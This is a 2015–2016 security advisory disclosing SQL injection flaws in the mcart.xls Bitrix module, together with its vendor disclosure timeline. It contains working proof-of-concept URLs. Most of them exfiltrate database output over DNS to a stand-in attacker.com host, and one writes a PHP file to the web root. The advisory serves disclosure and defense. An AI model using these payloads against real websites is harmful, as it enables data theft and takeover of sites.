@@ -1,0 +1,99 @@
+Advisory ID: HTB23279
+Product: mcart.xls Bitrix module
+Vendor: www.mcart.ru
+Vulnerable Version(s): 6.5.2 and probably prior
+Tested Version: 6.5.2
+Advisory Publication:  November 18, 2015  [without technical details]
+Vendor Notification: November 18, 2015 
+Public Disclosure: January 13, 2016 
+Vulnerability Type: SQL Injection [CWE-89]
+CVE Reference: CVE-2015-8356
+Risk Level: Medium 
+CVSSv3 Base Score: 6.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L]
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered multiple SQL Injection vulnerabilities in mcart.xls Bitrix module, which can be exploited to execute arbitrary SQL queries and obtain potentially sensitive data, modify information in database and gain complete control over the vulnerable website.
+
+All discovered vulnerabilities require that the attacker is authorized against the website and has access to vulnerable module. However the vulnerabilities can be also exploited via CSRF vector, since the web application does not check origin of received requests. This means, that a remote anonymous attacker can create a page with CSRF exploit, trick victim to visit this page and execute arbitrary SQL queries in database of vulnerable website. 
+
+1. Input passed via the "xls_profile" HTTP GET parameter to "/bitrix/admin/mcart_xls_import.php" script is not properly sanitised before being used in SQL query. A remote authenticated attacker can manipulate SQL queries by injecting arbitrary SQL code.
+
+The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP address for `version()` (or any other sensitive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):
+
+http://[host]/bitrix/admin/mcart_xls_import.php?del_prof_real=1&xls_profile=%27%20OR%201=(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))+--+
+
+2. Input passed via the "xls_profile" HTTP GET parameter to "/bitrix/admin/mcart_xls_import.php" script is not properly sanitised before being used in SQL query. A remote authenticated attacker can manipulate SQL queries by injecting arbitrary SQL code.
+
+A simple exploit below will write "<?phpinfo()?>" string into "/var/www/file.php" file:
+
+http://[host]/bitrix/admin/mcart_xls_import.php?xls_profile=%27%20UNION%20SELECT%201,%27%3C?%20phpinfo%28%29;%20?%3E%27,3,4,5,6,7,8,9,0%20INTO%20OUTFILE%20%27/var/www/file.php%27%20--%202
+
+Successful exploitation requires that the file "/var/www/file.php" is writable by MySQL system account.
+
+3. Input passed via the "xls_iblock_id", "xls_iblock_section_id", "firstRow", "titleRow", "firstColumn", "highestColumn", "sku_iblock_id" and "xls_iblock_section_id_new" HTTP GET parameters to "/bitrix/admin/mcart_xls_import_step_2.php" script is not properly sanitised before being used in SQL query. A remote authenticated attacker can manipulate SQL queries by injecting arbitrary SQL code.
+
+Below is a list of exploits for each vulnerable parameter. The exploits are based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP address for `version()` (or any other sensitive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):
+
+"xls_iblock_id":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0,0,0,0,0,0,0,0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+"xls_iblock_section_id"
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"firstRow":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0,0,0,0,0,0,0,0,0(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&titleRow=0&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"titleRow":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0,0,0,0,0,0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"firstColumn":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0%27,0,0,0,0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"highestColumn":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0&highestColumn=0%27,0,0,0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"sku_iblock_id":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1,0,0,0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+&cml2_link_code=1&xls_iblock_section_id_new=0
+
+"xls_iblock_section_id_new":
+
+http://[host]/bitrix/admin/mcart_xls_import_step_2.php?save_profile=Y&make_translit_code=Y&xls_iblock_id=0&xls_iblock_section_id=0&XLS_IDENTIFY=0&firstRow=0&titleRow=0&firstColumn=0&highestColumn=0&XLS_GLOBALS=0&sku_iblock_id=1&cml2_link_code=1&xls_iblock_section_id_new=0,(select%20load_file(CONCAT(CHAR(92),CHAR(92),(select%20version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%29+--+
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Disclosure timeline:
+2015-11-18 Vendor notified via email, no reply.
+2015-12-01 Vendor notified via email, no reply.
+2015-12-04 Vendor notified via contact form and email, no reply.
+2015-12-11 Fix Requested via contact form and emails, no reply.
+2015-12-28 Fix Requested via contact form and emails, no reply.
+2016-01-11 Fix Requested via contact form and emails, no reply.
+2016-01-13 Public disclosure.
+
+Currently we are not aware of any official solution for this vulnerability.
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23279 - https://www.htbridge.com/advisory/HTB23279 - Multiple SQL Injection Vulnerabilities in mcart.xls Bitrix Module
+[2] mcart.xls - https://marketplace.1c-bitrix.ru/solutions/mcart.xls/ - A Bitrix module for upload and import data from Excel file. 
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
